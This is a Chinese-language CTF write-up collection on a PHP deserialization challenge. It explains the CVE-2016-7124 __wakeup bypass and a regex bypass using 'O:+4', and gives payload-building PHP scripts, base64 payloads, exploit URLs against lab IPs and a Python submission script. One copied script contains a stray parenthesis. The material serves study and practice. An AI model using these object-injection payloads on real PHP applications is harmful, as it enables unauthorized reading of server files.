PHP代码审计
0、
    php中带有双下划线（__）的是魔术方法，会在满足条件时自动调用
    序列化是把数据类型压缩成一个字符串，方便处理，反序列化是把字符串还原成数据类型
    正则表达式用于匹配字符串
有漏洞（CVE-2016-7124）可以通过**使序列化字符串中表示对象属性个数的值大于真实的属性个数，以此跳过__wakeup的执行**，
而PHP5 < 5.6.25， PHP7 < 7.0.10 的版本存在wakeup的漏洞。


writeup1：（1）进行代码审计,发现为反序列，如果一个类定义了wakup()和destruct()，则该类的实例被反序列化时，会自动调用wakeup(), 生命周期结束时，则调用desturct()。
	    （2）在 PHP5 < 5.6.25 >， PHP7 < 7.0.10 >的版本存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过。
	    （3）构造exphttp://192.168.100.161:62288/index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==,可得到flag。
题目：
<?php 
class Demo { 
    private $file = 'index.php';
//初始化，构造函数，创建时自动调用，用得到的参数覆盖$file
    public function __construct($file) { 
        $this->file = $file; //构造函数，对类的变量进行初始化
    }
//生命周期结束后的析构函数，销毁时调用，会显示文件的代码，这里要显示fl4g.php
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
//魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法。反序列化时调用，会把$file重置成index.php
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { //isset：检测变量是否设置且非空，_GOT:使用URL参数（查询字符串）传递给当前脚本的变量的关联数组
    $var = base64_decode($_GET['var']); 
//正则匹配，如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式})，不区分大小写，就输出stop hacking!否则的话就进行反序列化
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>

writeup2:
审计完成之后，思路就很清晰了，对Demo这个类进行序列化，base64加密之后，赋值给var变量进行get传参就行了
在类Demo中有三个方法，一个构造，一个析构，还有就是一个魔术方法，构造函数__construct()在程序执行开始的时候对变量进行赋初值。析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。
在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。

<?php
class Demo {
private $file = 'index.php';
//protected $file1 = 'index.php';
public function __construct($file) {
    $this->file = $file;
    //$this->file1 = $file1;
}
function __destruct() {
    echo @highlight_file($this->file, true);
}
function __wakeup() {
    if ($this->file != 'index.php') {
        //the secret is in the fl4g.php
        $this->file = 'index.php';(
    }
}
}
$a = new Demo("fl4g.php");
echo serialize($a)."\n";
//O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
echo base64_encode('O:+4:"Demo":2:{s:10:" Demo file";s:8:"fl4g.php";}');

修改之后，再进行base64加密，传参就可以了

index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==


writeup3:
根据题目可以知道是一个反序列化的题看到源码，需要绕过一个__wakeup()函数和一个正则匹配，才能高亮显示出fl4g.php文件。
主要的限制在两个函数：一个是类的魔术函数function __wakeup()，绕过该函数的方法是序列化字符串中标识变量数量的值大于实际变量即可绕过该函数 
另一个是正则匹配——if (preg_match('/[oc]:\d+:/i', $var)) ，正则匹配这里匹配的是O:4，我们用O:+4即可绕过

构造payload:


<?php
class Demo {
private $file = 'index.php';
//protected $file1 = 'index.php';
public function __construct($file) {
    $this->file = $file;
    //$this->file1 = $file1;
}
function __destruct() {
    echo @highlight_file($this->file, true);
}
function __wakeup() {
    if ($this->file != 'index.php') {
        //the secret is in the fl4g.php
        $this->file = 'index.php';
    }
}
}

$a= new Demo('fl4g.php');
$b=serialize($a);
$b=str_replace('O:4','O:+4',$b);
$b=str_replace('1:{','2:{',$b);

echo base64_encode($b);

复制输出的字符串再提交为var参数即可.

注意：这里的file变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），
字符串长度也比实际长度大2，如果将序列化结果复制到在线的base64网站进行编码可能就会丢掉空白字符，
所以这里直接在php代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。


writeup4：
题目过程，接受var变量并base64解码，匹配''/[oc]:\d+:/i''（首字母为o或c，冒号，一个或多个数字，冒号，忽略大小写），
成功提示stop hacking，失败反序列化var变量（程序结束会销毁新建的Demo对象，触发__destruct()）。

使用+可以绕过preg_match()，绕过__wakeup()是利用CVE-2016-7124，例如O:4:"Demo":2:{s:10:"\0Demo\0file";s:8:"fl4g.php";}（正常是O:4:"Demo":1:...），
反序列化化时不会触发__wakeup()


最后一个问题是使用hackbar或者浏览器直接var?=...的话\0会被认为是两个字符，需要使用python提交

import base64
import requests

s = base64.b64encode(b'O:+4:"Demo":2:{s:10:"\0Demo\0file";s:8:"fl4g.php";}')
url = 'http://111.198.29.45:43225/'
params = {'var':s}
r = requests.get(url,params=params)
print(r.text)


我的实现：
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
	$a=new Demo("fl4g.php");
	$b=serialize($a)."\n";
	$b=str_replace('O:4','O:+4',$b);
	$b=str_replace('1:{',"2:{",$b);
	echo base64_encode($b);
?>

将得到的结果给url传参：http://220.249.52.133:58561?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQo=

